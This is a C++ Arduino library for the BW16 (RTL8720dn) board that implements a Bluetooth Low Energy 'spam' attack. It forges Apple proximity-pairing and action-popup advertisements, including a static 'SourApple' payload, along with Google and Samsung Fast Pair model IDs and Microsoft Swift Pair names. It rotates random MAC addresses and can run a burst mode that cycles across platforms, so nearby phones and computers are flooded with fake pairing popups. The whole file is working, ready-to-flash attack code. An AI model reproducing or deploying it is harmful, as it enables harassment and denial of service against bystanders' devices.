/*
    Name: BW16 BLE Spam Library
    Platform: BW16 (RTL8720dn) - Ameba Arduino
    License: MIT
*/

#include "BW16BLESpam.h"

// No need to redeclare le_set_rand_addr, it's in gap_le.h or gap_adv.h via BW16BLESpam.h

namespace {
    struct Device {
        const char* name;
        uint32_t code;
    };

    const Device devices[] = {
        {"Bisto CSR8670 Dev Board", 0x0001F0},
        {"Arduino 101", 0x000047},
        {"Arduino 101 2", 0x470000},
        {"Anti-Spoof Test", 0x00000A},
        {"Google Gphones", 0x00000B},
        {"Android Auto", 0x000007},
        {"Test Android TV", 0x000009},
        {"Test Android TV 2", 0x090000},
        {"Fast Pair Headphones", 0x000048},
        {"LG HBS1110", 0x001000},
        {"Smart Controller 1", 0x00B727},
        {"BLE-Phone", 0x01E5CE},
        {"Goodyear", 0x0200F0},
        {"Smart Setup", 0x00F7D4},
        {"Goodyear 2", 0xF00002},
        {"T10", 0xF00400},
        {"ATS2833_EVB", 0x1E89A7},
        {"Bose NC 700", 0xCD8256},
        {"Bose QuietComfort 35 II", 0x0000F0},
        {"Bose QuietComfort 35 II 2", 0xF00000},
        {"JBL Flip 6", 0x821F66},
        {"JBL Buds Pro", 0xF52494},
        {"JBL Live 300TWS", 0x718FA4},
        {"JBL Everest 110GA", 0x0002F0},
        {"Pixel Buds", 0x92BBBD},
        {"Google Pixel Buds", 0x000006},
        {"Google Pixel Buds 2", 0x060000},
        {"Sony XM5", 0xD446A7},
        {"DENON AH-C830NCW", 0x038B91},
        {"JBL LIVE FLEX", 0x02F637},
        {"JBL REFLECT MINI NC", 0x02D886},
        {"JBL VIBE BEAM", 0xF00E97},
        {"JBL WAVE BEAM", 0x04ACFC},
        {"Beoplay H4", 0x04AA91},
        {"JBL TUNE 720BT", 0x04AFB8},
        {"WONDERBOOM 3", 0x05A963},
        {"B&O Beoplay E6", 0x05AA91},
        {"JBL LIVE220BT", 0x05C452},
        {"Sony WI-1000X", 0x05C95C},
        {"JBL Everest 310GA", 0x0602F0},
        {"LG HBS-1700", 0x0603F0},
        {"SRS-XB43", 0x1E8B18},
        {"WI-1000XM2", 0x1E955B},
        {"Sony WF-SP700N", 0x1EC95C},
        {"Galaxy S21 5G", 0x06AE20},
        {"OPPO Enco Air3 Pro", 0x06C197},
        {"Sony WH-1000XM2", 0x06C95C},
        {"soundcore Liberty 4 NC", 0x06D8FC},
        {"Technics EAH-AZ60M2", 0x0744B6},
        {"WF-C700N", 0x07A41C},
        {"Nest Hub Max", 0x07F426},
        {"JBL TUNE125TWS", 0x054B2D},
        {"JBL LIVE770NC", 0x0660D7},
        {"LG HBS-835", 0x0103F0},
        {"LG HBS-2000", 0x0903F0},
        {"Flipper Zero", 0xD99CA1},
        {"Free Robux", 0x77FF67},
        {"Free VBucks", 0xAA187F},
        {"Rickroll", 0xDCE9EA},
        {"Animated Rickroll", 0x87B25F},
        {"BLM", 0x1448C9},
        {"Obama", 0x7C6CDB},
        {"FBI", 0xE2106F},
        {"Tesla", 0xB37A62},
        {"Ton Upgrade Netflix", 0x92ADC9},
        {"Fallback Watch", 0x1A},
        {"White Watch4 Classic 44m", 0x01},
        {"Black Watch4 Classic 40m", 0x02},
        {"White Watch4 Classic 40m", 0x03},
        {"Black Watch4 44mm", 0x04},
        {"Black Watch4 40mm", 0x07},
        {"White Watch4 40mm", 0x08},
        {"Black Watch5 44mm", 0x11},
        {"Black Watch5 Pro 45mm", 0x15},
        {"White Watch5 44mm", 0x17},
        {"White & Black Watch5", 0x18},
        {"Black Watch6 Classic 43m", 0x1E},
    };
    const int devicesCount = sizeof(devices) / sizeof(devices[0]);

    const char* const windowsDevices[] = {
        "Xbox Wireless Controller",
        "Bose QC35 II",
        "Surface Keyboard",
        "Logitech MX Master 3",
        "Galaxy Buds Pro",
        "Sony WH-1000XM4",
        "Windows Phone",
        "Dell Mobile Mouse"
    };
    const int windowsDevicesCount = sizeof(windowsDevices) / sizeof(windowsDevices[0]);

    struct IosAction {
        uint8_t actionId;
        const char* name;
    };
    const IosAction iosActions[] = {
        {0x13, "AppleTV AutoFill"},
        {0x27, "AppleTV Connecting..."},
        {0x20, "Join This AppleTV?"},
        {0x19, "AppleTV Audio Sync"},
        {0x1E, "AppleTV Color Balance"},
        {0x09, "Setup New iPhone"},
        {0x02, "Transfer Phone Number"},
        {0x0B, "HomePod Setup"},
        {0x01, "Setup New AppleTV"},
        {0x06, "Pair AppleTV"},
        {0x0D, "HomeKit AppleTV Setup"},
        {0x2B, "AppleID for AppleTV?"},
        {0x05, "Apple Watch"},
        {0x24, "Apple Vision Pro"},
        {0x2F, "Connect to other Device"},
        {0x21, "Software Update"}
    };
    const int iosActionsCount = sizeof(iosActions) / sizeof(iosActions[0]);

    struct IosNewDeviceModel {
        uint16_t modelId;
        const char* name;
    };
    const IosNewDeviceModel iosNewDevices[] = {
        {0x0E20, "AirPods Pro"},
        {0x0A20, "AirPods Max"},
        {0x0220, "AirPods"},
        {0x0F20, "AirPods 2nd Gen"},
        {0x1320, "AirPods 3rd Gen"},
        {0x1420, "AirPods Pro 2nd Gen"},
        {0x1020, "Beats Flex"},
        {0x0620, "Beats Solo 3"},
        {0x0320, "Powerbeats 3"},
        {0x0B20, "Powerbeats Pro"},
        {0x0C20, "Beats Solo Pro"},
        {0x1120, "Beats Studio Buds"},
        {0x0520, "Beats X"},
        {0x0920, "Beats Studio 3"},
        {0x1720, "Beats Studio Pro"},
        {0x1220, "Beats Fit Pro"},
        {0x1620, "Beats Studio Buds+"}
    };
    const int iosNewDevicesCount = sizeof(iosNewDevices) / sizeof(iosNewDevices[0]);

    uint8_t AirpodsProGen2Static[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
}

BW16BLESpammer::BW16BLESpammer() : 
    _advert(nullptr), 
    _bleActive(false), 
    _currentType(IOS_NEW_DEVICE),
    _burstMode(false), 
    _androidOnlyBurst(false), 
    _burstPhase(0), 
    _lastBurstMs(0), 
    _intervalMs(1000), 
    _debugLog(false) 
{
}

void BW16BLESpammer::begin() {
    if (!_bleActive) {
        BLE.init();
        BLE.beginPeripheral();
        
        // Initial random MAC
        uint8_t newMac[6];
        _generateRandomMac(newMac);
        le_set_rand_addr(newMac);
        
        _advert = BLE.configAdvert();
        
        uint8_t addr_type = 1; // GAP_LOCAL_ADDR_LE_RANDOM
        le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, 1, &addr_type);
        
        _bleActive = true;
    }
}

void BW16BLESpammer::start(SpamType type) {
    if (!_bleActive) {
        begin();
    }
    
    _currentType = type;
    _burstMode = (type == ALL_BURST || type == ANDROID_BURST);
    _androidOnlyBurst = (type == ANDROID_BURST);
    _lastBurstMs = 0; // force immediate trigger
    _burstPhase = 0;
    
    if(_debugLog) Serial.println("BLE: Spammer cycle started");
}

void BW16BLESpammer::stop() {
    if (_advert) {
        _advert->stopAdv();
        _advert = nullptr;
    }
    if (_bleActive) {
        BLE.end();
        _bleActive = false;
        if(_debugLog) Serial.println("BLE: Spammer stopped & deinitialized");
    }
    _burstMode = false;
}

bool BW16BLESpammer::isActive() const {
    return _bleActive;
}

void BW16BLESpammer::setInterval(unsigned long ms) {
    _intervalMs = ms;
}

void BW16BLESpammer::setDebugLogging(bool enable) {
    _debugLog = enable;
}

void BW16BLESpammer::tick() {
    if (!_bleActive || !_advert) return;
    unsigned long now = millis();
    
    // Check if Dwell Time has elapsed
    if (now - _lastBurstMs < _intervalMs) return;
    _lastBurstMs = now;

    // Stop advertising before updating payload & MAC
    _advert->stopAdv();

    // Rotate MAC address using underlying Realtek GAP API
    uint8_t newMac[6];
    _generateRandomMac(newMac);
    le_set_rand_addr(newMac);
    uint8_t addr_type = 1; // GAP_LOCAL_ADDR_LE_RANDOM
    le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, 1, &addr_type);

    if (!_burstMode) {
        _advData = _generateUniversalAdvertisementData(_currentType);
        _advert->setAdvData(_advData);
        _advert->updateAdvertParams();
        _advert->startAdv();
        return;
    }

    // Rotation schedule
    SpamType nextType;
    if (_androidOnlyBurst) {
        nextType = GOOGLE;
    } else {
        uint8_t slot = (_burstPhase++ % 7);
        if (slot < 2) {
            nextType = IOS_NEW_DEVICE;
        } else if (slot < 4) {
            nextType = IOS_ACTION_MODAL;
        } else if (slot < 6) {
            nextType = GOOGLE;
        } else {
            nextType = MICROSOFT;
        }
    }

    _advData = _generateUniversalAdvertisementData(nextType);
    _advert->setAdvData(_advData);
    _advert->updateAdvertParams();
    _advert->startAdv();
}

void BW16BLESpammer::_generateRandomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)random(0, 256);
        if (i == 5) { mac[i] |= 0xC0; } // Static Random Address requires MSB top 2 bits = 1.
    }
}

void BW16BLESpammer::_dumpPayload(uint8_t* data, uint8_t len) {
    if(!_debugLog) return;
    Serial.print("HEX: ");
    for (uint8_t i = 0; i < len; i++) {
        if (data[i] < 0x10) Serial.print("0");
        Serial.print(data[i], HEX);
        Serial.print(" ");
    }
    Serial.println();
}

BLEAdvertData BW16BLESpammer::_generateUniversalAdvertisementData(SpamType Type) {
    BLEAdvertData advData;
    uint8_t i = 0;

    switch (Type) {
        case MICROSOFT: {
            const char* deviceName = windowsDevices[random(0, windowsDevicesCount)];
            int nameLen = strlen(deviceName);
            if (nameLen > 24) nameLen = 24; 
            
            i = 0;
            _msPayloadBuf[i++] = (uint8_t)(nameLen + 6); 
            _msPayloadBuf[i++] = 0xFF; 
            _msPayloadBuf[i++] = 0x06; 
            _msPayloadBuf[i++] = 0x00; 
            _msPayloadBuf[i++] = 0x03; 
            _msPayloadBuf[i++] = 0x00;
            _msPayloadBuf[i++] = 0x80;
            memcpy(&_msPayloadBuf[i], deviceName, nameLen);
            i += nameLen;
            advData.addData(_msPayloadBuf, i);
            if(_debugLog) {
                Serial.print("Adv: Microsoft: "); Serial.println(deviceName);
                _dumpPayload(_msPayloadBuf, i);
            }
            break;
        }
        case IOS_ACTION_MODAL: {
            uint8_t payload[31];
            i = 0;
            const IosAction& action = iosActions[random(0, iosActionsCount)];
            
            payload[i++] = 10; 
            payload[i++] = 0xFF; 
            payload[i++] = 0x4C; 
            payload[i++] = 0x00; 
            payload[i++] = 0x0F; 
            payload[i++] = 0x05; 
            
            uint8_t flag = 0xC0;
            if (action.actionId == 0x20 && random(0, 2) == 1) flag = 0xBF;
            if (action.actionId == 0x09 && random(0, 2) == 1) flag = 0x40;
            if (action.actionId == 0x21) flag = 0x40;
            
            payload[i++] = flag; 
            payload[i++] = action.actionId; 
            payload[i++] = random(0, 256);
            payload[i++] = random(0, 256);
            payload[i++] = random(0, 256);
            
            advData.addData(payload, i);
            if(_debugLog) {
                Serial.print("Adv: Apple Action: "); Serial.println(action.name);
                _dumpPayload(payload, i);
            }
            break;
        }
        case IOS_NEW_DEVICE:
        case APPLE_JUICE: {
            uint8_t payload[35];
            i = 0;
            const IosNewDeviceModel& model = iosNewDevices[random(0, iosNewDevicesCount)];
            
            uint8_t budsBattery = (random(0, 10) << 4) | random(0, 10);
            uint8_t caseBattery = (random(0, 8) << 4) | random(0, 10);
            uint8_t lidCount = random(0, 256);
            
            payload[i++] = 30; // Length
            payload[i++] = 0xFF; 
            payload[i++] = 0x4C; 
            payload[i++] = 0x00; 
            
            payload[i++] = 0x07; // Type
            payload[i++] = 0x19; // Internal size
            payload[i++] = 0x07; // Prefix
            
            payload[i++] = (uint8_t)(model.modelId >> 8); 
            payload[i++] = (uint8_t)(model.modelId & 0xFF); 
            payload[i++] = 0x75; // Status
            payload[i++] = budsBattery; 
            payload[i++] = caseBattery; 
            payload[i++] = lidCount; 
            payload[i++] = 0x00; 
            payload[i++] = 0x00; 
            
            for(int j=0; j<16; j++) {
                payload[i++] = random(0, 256);
            }
            
            advData.addData(payload, i);
            if(_debugLog) {
                Serial.print("Adv: Apple New Device: "); Serial.println(model.name);
                _dumpPayload(payload, i);
            }
            break;
        }
        case SOUR_APPLE: {
            advData.addData(AirpodsProGen2Static, 31);
            if(_debugLog) Serial.println("Adv: SourApple (Static AirpodsProGen2)");
            break;
        }
        case SAMSUNG: {
            const uint32_t model = 0x06AE20; // Galaxy S21 5G
            _googleBuf[0]  = 0x03; _googleBuf[1]  = 0x03; _googleBuf[2]  = 0x2C; _googleBuf[3]  = 0xFE;
            _googleBuf[4]  = 0x06; _googleBuf[5]  = 0x16; _googleBuf[6]  = 0x2C; _googleBuf[7]  = 0xFE;
            _googleBuf[8]  = (uint8_t)((model >> 0x10) & 0xFF);
            _googleBuf[9]  = (uint8_t)((model >> 0x08) & 0xFF);
            _googleBuf[10] = (uint8_t)((model >> 0x00) & 0xFF);
            _googleBuf[11] = 0x02; _googleBuf[12] = 0x0A; _googleBuf[13] = (uint8_t)(random(0, 120) - 100);
            advData.addData(_googleBuf, 14);
            if(_debugLog) Serial.println("Adv: Samsung Fast Pair");
            break;
        }
        case GOOGLE:
        case ANDROID_BURST: {
            const uint32_t model = devices[random(0, devicesCount)].code;
            _googleBuf[0]  = 0x03; _googleBuf[1]  = 0x03; _googleBuf[2]  = 0x2C; _googleBuf[3]  = 0xFE;
            _googleBuf[4]  = 0x06; _googleBuf[5]  = 0x16; _googleBuf[6]  = 0x2C; _googleBuf[7]  = 0xFE;
            _googleBuf[8]  = (uint8_t)((model >> 0x10) & 0xFF);
            _googleBuf[9]  = (uint8_t)((model >> 0x08) & 0xFF);
            _googleBuf[10] = (uint8_t)((model >> 0x00) & 0xFF);
            _googleBuf[11] = 0x02; _googleBuf[12] = 0x0A; _googleBuf[13] = (uint8_t)(random(0, 120) - 100);
            advData.addData(_googleBuf, 14);
            if(_debugLog) Serial.println("Adv: Google Fast Pair");
            break;
        }
        default:
            break;
    }

    return advData;
}
